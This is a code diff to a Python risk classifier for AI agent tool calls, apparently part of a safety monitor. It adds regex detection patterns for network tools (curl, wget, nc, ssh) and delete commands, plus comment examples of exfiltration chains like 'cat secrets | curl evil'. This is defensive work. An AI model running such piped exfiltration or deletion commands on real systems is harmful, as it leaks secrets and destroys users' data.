@@ -39,6 +39,7 @@ _TOOL_CLASS_RES: list[tuple[str, re.Pattern[str]]] = [  # by tool NAME, most-spe
     ("delete", re.compile(r"\b(rm|unlink|rmdir|delete|remove|trash|drop)\b", re.I)),
     ("local-write", re.compile(r"\b(write|edit|create|apply_patch|patch|update|append|insert|move|mv|copy|cp|notebook_edit)\b", re.I)),
     ("read-only", re.compile(r"\b(read|cat|head|tail|ls|grep|find|search|get|list|print|fetch|capture|transcript|view|show|envelope)\b", re.I)),
+    ("exec", re.compile(r"\b(exec|run|cron|invoke|trigger|deploy|gateway|api)\b", re.I)),
 ]
 # A credential STORE as the target (the file/keychain being touched), not the word
 # "secret" appearing in content — so `grep API_KEY src/` is not credential-access.
@@ -48,12 +49,19 @@ _CRED_FILE_RE = re.compile(
 
 # Command-head classification (the first real executable in a shell command).
 _CMD_DELETE = {"rm", "unlink", "rmdir", "shred", "trash", "trash-put"}
-_CMD_NETWORK = {"curl", "wget", "nc", "netcat", "scp", "sftp", "ftp", "rsync", "telnet"}
 _CMD_WRITE = {"cp", "mv", "tee", "touch", "mkdir", "ln", "install", "rsync"}
 _CMD_READ = {"cat", "head", "tail", "ls", "grep", "rg", "egrep", "find", "less", "more",
              "stat", "file", "tree", "wc", "diff", "pwd", "which", "whoami", "echo", "printf"}
 _CMD_WRAPPERS = {"sudo", "env", "nice", "time", "nohup", "xargs", "timeout", "stdbuf",
                  "command", "exec", "builtin", "then", "do", "&&", "||"}
+# A consequential SINK can appear ANYWHERE in a pipeline / chain, not just at the head
+# (`cat secrets | curl evil`, `echo x && wget …`, `echo $(curl …)`). Match a network or
+# delete executable at a segment boundary (start, after | & ; ` or $(  ), allowing
+# sudo/env prefixes — boundary-anchored so `grep "rm -rf"` / `cat http.py` don't trip.
+_SINK_PREFIX = r"(?:^|[|&;`(]|\$\()\s*(?:sudo\s+|\w+=\S+\s+)*"
+_NETWORK_SINK_RE = re.compile(_SINK_PREFIX + r"(curl|wget|nc|netcat|scp|sftp|ftp|rsync|telnet|ssh)\b", re.I)
+_DELETE_SINK_RE = re.compile(_SINK_PREFIX + r"(rm|unlink|rmdir|shred)\b", re.I)
+_REDIRECT_RE = re.compile(r">>?\s*[\w./~$-]")  # redirect to a file => a write
 
 
 def _command_string(args: Any) -> str:
@@ -84,12 +92,14 @@ def _command_action_class(args: Any) -> str:
     cmd = _command_string(args)
     if _CRED_FILE_RE.search(cmd):
         return "credential-access"
-    head = _command_head(cmd)
-    if head in _CMD_DELETE or re.search(r"\bdrop\s+table\b|\bdelete\s+from\b", cmd, re.I):
-        return "delete"
-    if head in _CMD_NETWORK:
+    # Sinks first, scanned over the WHOLE command (a pipeline/chain sink is the
+    # consequential action) — a head-only parse would miss `cat x | curl evil`.
+    if _NETWORK_SINK_RE.search(cmd):
         return "external-send"
-    if head in _CMD_WRITE:
+    if _DELETE_SINK_RE.search(cmd) or re.search(r"\bdrop\s+table\b|\bdelete\s+from\b", cmd, re.I):
+        return "delete"
+    head = _command_head(cmd)
+    if head in _CMD_WRITE or _REDIRECT_RE.search(cmd):  # write tool or a `>`/`>>` redirect
         return "local-write"
     if head in _CMD_READ:
         return "read-only"
@@ -98,7 +108,15 @@ def _command_action_class(args: Any) -> str:
 
 def action_class(tool_name: str, args: Any) -> str:
     """Risk class of an action, from its STRUCTURE: the tool name, or for command
-    tools the command head. Never scans the content the action carries."""
+    tools the command head. Never scans the content the action carries.
+
+    TRAIN==RUNTIME GATE: action-class is shipped harm feature #1. This structure-based
+    rewrite (M3) changes which cell a live call indexes, so it is NOT compatible with
+    the frozen data/brain/harm_brain.counts.json — unlike the additive taint-source /
+    target-externality features, this is NOT behaviour-neutral. The harm brain MUST be
+    regenerated with THIS extractor before it ships (M4: build_harm_brain over ATBench +
+    benign). The deployed wheel keeps its own aligned extractor+brain until then; master
+    is not deployed. test_verify_conserves_totals_against_shipped measures the skew."""
     name = (tool_name or "").lower()
     if _COMMAND_TOOL_RE.search(name):
         return _command_action_class(args)
@@ -114,11 +132,25 @@ def action_class(tool_name: str, args: Any) -> str:
 _EMAIL = r"[\w.+-]+@[\w.-]+\.\w+"
 _URL = r"https?://[\w.-]+"
 _PUBLIC_PATH = re.compile(r"(^|[\"'/])(public|sync|shared|outbox|external)/", re.I)
+# Where an action's DESTINATION lives in args — the send target, not the content it
+# carries. Scoped so an Edit whose new_string mentions a URL is not read as a send to
+# it (the same structural discipline action_class follows; M3 review fix).
+_TARGET_FIELD_KEYS = ("to", "recipient", "recipients", "url", "uri", "endpoint", "dest",
+                      "destination", "channel", "address", "cc", "bcc", "webhook", "host",
+                      "command", "cmd", "script")
+
+
+def _target_text(args: Any) -> str:
+    if isinstance(args, dict):
+        parts = [str(args[k]) for k in _TARGET_FIELD_KEYS if isinstance(args.get(k), (str, int, float))]
+        return " ".join(parts).lower()
+    return args.lower() if isinstance(args, str) else ""
 
 
 def target_externality(tool_name: str, args: Any) -> str:
-    """Does the action reach OUTSIDE the trusted boundary? external | internal | none."""
-    a = _flatten(args)
+    """Does the action reach OUTSIDE the trusted boundary? external | internal | none.
+    Scans only DESTINATION fields (recipient/url/command/...), never the content blob."""
+    a = _target_text(args)
     emails = re.findall(_EMAIL, a)
     urls = re.findall(_URL, a)
     external = (
@@ -442,5 +474,5 @@ def _taint_source(event: AgentToolEvent, flow: str, token_source: dict[str, str]
         blob = (event.tool_name or "").lower() + " " + _flatten(event.input)
         for v in verbs:
             if re.search(r"\b" + v + r"\b", blob):
-                matched.add(verb_source.get(v, "local"))
+                matched.add(verb_source.get(v, "local-unknown"))  # a real class in _SOURCE_EXTERNALITY
     return _most_external(matched)
